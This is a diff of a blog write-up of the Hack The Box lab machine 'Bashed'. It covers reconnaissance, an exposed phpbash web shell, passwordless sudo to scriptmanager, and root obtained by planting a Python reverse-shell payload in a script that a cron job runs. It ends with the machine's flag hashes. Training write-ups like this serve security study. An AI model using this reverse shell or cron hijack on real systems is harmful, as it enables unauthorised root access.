@@ -1,28 +1,70 @@
 ---
 layout: post
 title:  "HTB Bashed Linux"
-description : 
-tags: 
+description : Techniques used, cron-jobs hickjacking, sudo permissions
+tags: HTB, linux, python, sudo, cron-job
 ---
 
 # HTB Bashed
 
 # Recon
+Nmap scan
+```ruby
+Nmap scan report for 10.10.10.68
+Host is up (0.022s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
+|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
+|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
+|   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
+|_  /uploads/: Potentially interesting folder
+```
+
+
+Dirbuster scan
+![](https://lh3.googleusercontent.com/p-Az8pLCCTYFiLlCET_o0v7tApv-cTEcdmdJV-DyvqIGcGfYpQLFuim_jF3KDWhSrIc9DRErwMY7sFOffstVjceAfYJUHs_Vhq3DczRAGGDDFzHDSYkVQBM_bQxo33LG60o7-GYwIkIE4P5ma35h7H8IIstoZ3GIqqcxV4hVvdEMzLKACD07Ki5ASb1GSp5cw9s_XFues8tREQoOtRQdkICwWzdkB7qbYZHdHMw3uh8ZVZ5jNJDbmaOKkWy_RI1LOXoSV3OJU36VXtgpRVqpAu0ciDdHK3MLkUwBavIDFunv4f46pWujHZGUZE68pue4UOVqSbUHLcSptrk3trAd2pEW_cSa6XGIrtvaPOXRtN9i8aUj-j1AxXslr9BReBPU5Q8D_7OalQ3Rhm0crohqJWbyO4y7QpgFBsZErLqMWXjsRzZzmE68X-yvjFlzOYhg6auzm8xjoZIvuq6hi7giF0lPuA7STUGMFxGDKCh-KVV31MIyGSHrwNcLAzr1L2DnwFEJRCXDEloTTtKRHyN3ZPPzWM5owANdFTX6ZkvgfxerDlIc2ucFSwRk3YBESPsRp9bOyVfn3EJpbItc5ynKJMj2ZRjcRIf34EU42mAgBroULlkLojoXL0EzIech5s-8I_dDAxcRxRnRmKY9ydQTsGLE7-5wN8R4diGYsrkIiGEu8Naj2QbRf1U=w533-h340-no)
+
+We access the web app running on port:80 and quickly noticed that is running a `phpbash`. 
+Furthermore, we investigate the `dev` folder and we encounter two php scripts deployed
+![](https://lh3.googleusercontent.com/rHt8sWBKRtNiW-cqbo5Ww3wBmFYzSUhB5gW15CwDLd9-JIXQmY54qC52-YNjK9696pECh6s9p0KeHLDUo3fsfqqOkNt8kYMZpgFvDEdKuQs5wuKpGXJx5kxaVy3C2eHhPH5_X62cUfFIDVJP_PFu6W24Oqw5R58OxqPuiXtViF_gXJuZSwXqqSqtdfxFpU68uk5Y_29EJAHnoJzSd35SfmrWv--sSeDHYfbAQI8YzWVn-QoURCj39mnEFO61YZ64Uu85aaTJy02XMWVmjZD5H3Q1XdUgwYbr6sAFfl5Z7MbNhSWmJ2UnNdBJdub8rY_pbqprawbxtmp528jocKQKh3p11RrqiNBisZIX9AXH4_l8vpo6tFRMBSR7uGdZGfGF5YtvuaK7kWKr6nhkn3F3rLG-cS5qTg0vOhT6mYtn5cOEHDaXjT8cQ2Na8o1czFGkhvxxDqbeTG8lEAt0JDZNXKl5mmIMrj7mvmTAHxfERjPHRbF1-EoCzAwhApiujhp0KDbDZehlCSPDALwf_I4ircv2v7hUFjUc8wnTu3N9hUXJcaJpMzGgljImPr3JpvAGKKsbFDWehc_w9-1rkOO_wZh8iramVzMs8CiKSmU3tp2R0bnZzOj-nKnASjdQT-MG5AvlZ2sQeHo1aKsbjyQOV6nAHMp9LeU95F-eFho9pVRSOURUWmLIXlM=w468-h295-no)
+
+we run the phpbash script and we find out this is a backdoor shell that connects to the targer machine.
+![](https://lh3.googleusercontent.com/-MJGoTGb1t21rtxi0eI5TjHfBSSbn2B11_r2CKwBJ8vhrvPEr1IuoLtMcO1qNyEd2c6B_oTDCLGOfER_sPgXGG7rd5ksOI_CP7KmQa8EKFWSCOOfbp2AOtxJoEF088SES-fvxRFAI9kvdc0hYwViv5PVymG_yliJ9qzHnCXntBTVdzPKqXVfby8X_pPp6dORLK4pfN_PpkeKiNcwQHxnICTdyRJw44AE2najx1NZ7pRGolnKKP56fu7RGHDylQS3WvFdaZgvJ3spQkCWMh_Z7HzUzVPSA-BgtS636OD4IIcwG8EpUKmIiIfv2xjyAHSwzRI8v1R_g0bh2kV-Gyq911x-3b6ob2b_HhZSFBB3TqF-wCKGcUmjFG0V8f00U9hRYQyWEJVzOzJYcj2kWNqzb_KldAX138rsQCCjgClAGm6GBRWyFR7nwHw2HUhDfALGOe5I_VH4j-fUsT4K8vcuz7DPy6aBU8S2k7oWd9smm5LwN8HxelJ7nOPVgfQt9Rn4HZjKLFV8JYT4Ci5ZdAlKghbUN2pIqjBynOQaku-JX0Ce2JdJ_4qtjDVmN-DdExbOkVRIflPTyNHfg9CIeUknY3DfZOm8jFzmhw1T580Lwwd_7fdmaWfXmr_HL9upftTfpcT-csU-vyXGZMe6YiLaoLvsW6rurkKz_9ib1BEMPV6Y03S0PiCwibA=w842-h213-no)
+
+However the shell is not interactive. so I use nectcat to transfer a `tcp_pty.py` python file to satisfied our needs.
+
+![](https://lh3.googleusercontent.com/tqfU55RRL9rnsrmJu14kSTNEuoF163nki3XVFojCv45FcqFyLij2ufqxkxeS0-aP2BtGGhABm6ZKHNuctax8n12a6Oti8S9ZVLKHeUzjHyi-an8RsVjqNgVdlZm8kuI5fPTPIfHi4Tfg_RxFw_ijHbreaggUtIDsloBkgggnJgvgZfjjhpannxal-rJCglRtBCzID7CcICeKXQUMI7YTJq8oUSSJSzAnaZ_Er-0GiOtDllGwAi7sXJ0v8B6Dc04W8I_9SZBwyfpSusi5gtr4vTRnHo3pIyvcHeIUJZLKeW3xfc_dCEdj_THcAtPE7rNgvPzxn3mb9-K92JkJYhiyPGuCh0u6X-1YGHSjth6PO7uq3N20v0ctsR_Pr8RCE0yY5Smw7imYwkttt6UrcC6h99kJcF0tvjyx_pVcCARYb_9JcI6IAkcwRQT--96u0FdN_XUbiRbK0UyvPg-KnyyCcj_NY9ZT4v96woWQQaNf5Vgbq26SCPWsjHyyw3kPDyBZYLtZxhaFOv-GvJldcxz1CptsBgkmpERJkJ51a5QwNg4jQpt1ewnatddS3JhbDxQ3H3QWC51qCXlqeBajw7xIAsJeNvPZq-Ats_L1wLTG7EVlJBXdTJwhxpYqkgpomPIFBYaVaBL-md4K0coBAaG7HUXcO_zwoP8Kv3y1LlmY2Kjyj5W7E4V7Uy0=w894-h397-no)
+
+![](https://lh3.googleusercontent.com/evvfMIper2SfsSvgR5pysRX29meAvgfSb7fTA555xU927NyFVVauAVqEMUp4uAFpNXH9umzzgA-rYKvgw11k_z0x5Lu2aZ3ZmmhOliUDRSQ7s_qQMihu5cGEoEN7EQPYsjRxrP6OaPMitDsz5_RZjnOgc7LoNzpeSRhcaOea3GhrLiVzwdVdvEBM3fgVSdciFjf8_Thv5hNyZ_QTHm-UI0_FI1Dfak_GP_7tLQBrHSn_yvD37WeoEz7g2v73ZN_fRFMChv-EM8R1Yk5DEOsRGJrUnTK9PbmGIb_qz6cBGRT3m3XX0ANTNnb5O1QcZc_K6coXLi1CuXMgUVB40fOT9HgGG1rQBL5DHl9bSiwBOdaP19l87_AygXtR2eNMT3W5Eqo8OahWoXcgz0kBevlAJ7rRJWbDRYZ62fKMnGe7-tPMutiIiYbnFe_JAVJQooXrOGJhvs18sEo2TBMjH91sUsRcRkPBPSS-qRjsnsGuM3HD8ghyB1kHvvSZHA0owPjA1x3uunVQ_wW-nEdD2JqXO-q_TV57spPJVvSPS2XvHCnmWwwAR7BAPKf7WEksMLCwUVsONl7jAhlBgUfYHmSZrbYNXFs6zQSGPDzbbDSqnvbdz77t-Q0Wn130d1559wqYJNuamx2623hSbCC4uwtb7BvCQ1jon8V80BMWkmlBaDYEUKJZyJychsw=w1180-h354-no)
+
+
 # Exploitation
-1. We run LinuxEnum and we noticed that we are able to sudo commands without passwd for user
+We run LinuxEnum and we noticed that we are able to sudo commands without passwd for user
 **scriptmanager**
-```perl
+
+![](https://lh3.googleusercontent.com/1vF8x_ngRjD6Fy-Wi-B9fjLE-1M8SX8sa-YcNzPY00epfNJq9h15EDCF3thztjSY0ZSmqX0XaO40qf2_FDighO3qvdll_1-EcXP6MC1WN8XuMPuBWep8GqkDoxicbeuPUxSNyXwP9JZLOuGK5xdFniik6um0xLWMP3O_x-WtoaEx3SEllnoxTW_B3IhjxtyfDhb7yeZIJ4DW4bVzBKPpuaRVKtBZ_RfMgwtDnW-fK7F5a9zRZvh30ffDnEdVEV08meoapAj0s1jbYDRTAHV5ILEmlbAV9J_B66P1OhY6K5QKhVytI9cvJQ4CgTiteyQWSEmmXpt_qgD0b84fXBZ_LYLbBTT5SQ8sBT_s5nVKfvLnVauuSLJ0QnXmxV-wq3zUJS0suSgEUYkxuxrCah56r5_cuAUEnNfyHsWvI3XigoC0AFMU_yq3hYUfBNhB863xrGsBX6hf8DoYhOIprLxMSgXNE9YtULEFDD8Y5b7KMtl_hdFdfiWbcU2uPrD6-Cv3ZHse7mXEWvmpNqgdQaJIkYZnJceGVxdsHGfvjTZnSMFCa8QBKm4XLFLeC1AsYo1v4HWRunbwVQmO7hRIn4CmDZieiJkB5t51CqJ1-h3b5PiK3PhzMWMuJkk-3W-vwTpxYNQrCdi6fEnFNKfTSzp_--LuiXw5Bb2ed8TAZLRZLylhBJMjoiiu5dc=w912-h121-no)
+
+```ruby
 sudo -u scriptmanager whoami
 ```
-```perl
+```ruby
 sudo -u scriptmanager bash
 ```
+![](https://lh3.googleusercontent.com/9yx1EPOA3p-E7IO7jwguOezkX13GBLgZoxnMvxiYcrrmBfHROedL9ZClsvMt_vbibWyGTPX1uJ7Z1Fm_2i04TKFYoQsZi7hdTC1xSUKxVzD8zpST9ESyUNbqOzzOFh3drCxDQdrf8cDbRKWu02-qFGHan7yKxZrnZIJeTTqOokdpiSoyPsG-pBX8uxFdhPX3qieWlPOqpRhJYlKVHOkcATLqy15pQGwaFVzYbIZ35J2RPBBT97JFTMJQQzjfYih6bGGGMabT5cKaSxz-4FDtdTA4fTwwtLeOKiXu6T_-x3Z1DIwndh7fNqczc_BDBbM79Sf9RJC8yVl8ZzhNcxFIvXxxVoT6-PT4G95QLTaRWt-oRnSeqSDiPk6YR7rjpGu0BqUsMBsuDsxKaMAiWMJt_HoXXSaNL4sRi19anU44bwIP2eU6LvhtRffbCFUIGubdk_rc5dTQHp4KQqdJHDwlq34sCj_XF7ZZZVBcppg9_yqa6GzM6Lu4Y_Ywf7yhLta4EH1RQXiTIDoFGnBDlD5cbG_BmgELuMlffAHmk4OQE6tVH0evgWkcR2ESTRQohcCa9lPMa7e6aSn4k6_GGufmYM3Cjk1bqef7ToeDc5pwhHrvA8CHwMckwRsLwHrAE8_BTjksJxxVcvxN7k4--YSc1lyXi3L7vaAJdjxH7CvPfhVD86gdKeCcZHE=w603-h243-no)
+
 # Privilege Escalation
-1. As scriptmanager user we locate a script folder that contain 2 insterested files
-test.py and test.txt
-2. test.txt is owned by root but the text.py is owned by scriptmanager
-the text.txt file is update every minute so it appers is a cron job
+As scriptmanager user we locate a script folder that contain 2 insterested files
+test.py and test.txt. Test.txt is owned by root but the text.py is owned by scriptmanager
+The text.txt file is update every minute so this is a cron job
 so we modified the python file to pull to call for a reverse shell
+![](https://lh3.googleusercontent.com/G6p-UTwhnYCXBurI6bDEabPozrK9dBjiweY5QT7Fo9ZiVBZcqQjDx-tZm27RsXnik1pwEja8decnNZo8v8Q-9T4qoYU-yWiJlHEmfnjixLKXJ2ksJfaeaRKK5sOJs-jp3-xDyRfRL_1Zk5WZCAxkEpqIxsvXD0uH-fsPpPI_m4eYgNEjtJTGiVmzMSVhMVSFQ4MZuel0iSQkI22PmB9ZUBjqCCp6_u_L10FtTvA3PIXMCIuGKuwVxHL30UF7WjP1va6zJQW9O7Lkx0ba3vNUK3k4S-skgPkuswN1wbV8gBM7RGtdsLhJhy2qvC5Ho-gZx3AAmPyOa3jlG1JQXduQj_xVd24-8SVHxTE25iqGMxOTNmlLxHG3jKLJ-mU2Lgs8A9lJ-ljv1bMZcNyqCiWCpFkEHVnt4aE1w6NuAUNt1P_lbCOgcTolAwIazkeum5D1o_d-w7nXb_NcUfkCvPCpWE8QkkPx-CWxtLAYuOLGRm4fiHLPoOG_sDtY9_bWdBNH0gHdZTL5DIV3K81PGCHB-TGXUJWJnRLmuKsQ-JlJICyVmT4FQAiMI20Wx3-lmLs_wUOH12N-XUoDFzasPwzdVcp65NuwDFm5rB6bwFgnQte77ENC9JCMvKpTaPABsBiMGsdRXKnL_-bNnpCfNJXw8Jo7wLHCsOYuXfpl3yvGUTsmBhLtgS5udVM=w558-h27-no)
+
 ```perl
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -31,3 +73,10 @@ os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
+```
+![](https://lh3.googleusercontent.com/4spYvwMX11ocp0JnpHnTzPURbWJxRiIaIzhFbkWfPVDwZHKI-4MScg1wEFuujKMpQ2yzxHJd7APAnW5a1JXSXqB5NLTX8ghfxRZWosnCWfdI_HzIF-ORpziOeZlJiDLUt1yMjwD7KfCZ1OLDqZATjxgXCGLBfCNmvltUCdP2szVXF34MiF4ZZRlqgO4fmOT63wckfbvPge6S0R-Q9Bf2KmSv3nRg_BlwJThwpxX8sz2POnU9k6w1FyHlnZbdJ8LNs8nudFtb_qTM4gN9quAE_UeRjTkv-yg4DprYfUBfTMGwWOC5XVU6ApllJItREkEr_ySq-ysIvQkD9nY-Rgb-jxVp7HzcKbjOh-DwnEMU0NWa4IRifxbHeLo7Mi0FP-FvxcJFlUNXv4vw5eQWw6eXXnAxBDNS0da0TFU0l-f5ae3yf6P8Y16m8yM6jYAnC_o_MtpzB6srYIAeEEo8V5soKQLQjDI1yKL4nZqpheR4CtnvmwYhJmUZEUPzCnIkcELNk3FqgRfwUrF43puCwnajrSAX4lv3vBoigJFACJ27R_grvayEH_33HP-bBgn3fYsOHExO9OZkoFAdw0xA4uRkYsxih3V9CoTUJIg-0J78fnv6TE8vF2DF0jYSqefSb7_fhgqb63jdasOfCSBqPOJo78hc9Jcm0b8bynD7pQwOp_RJC0UP3eFBBNE=w607-h194-no)
+
+```ruby
+ROOT  "cc4f0afe3a1026d402ba10329674a8e2" 
+USER  "2c281f318555dbc1b856957c7147bfc1" 
+```
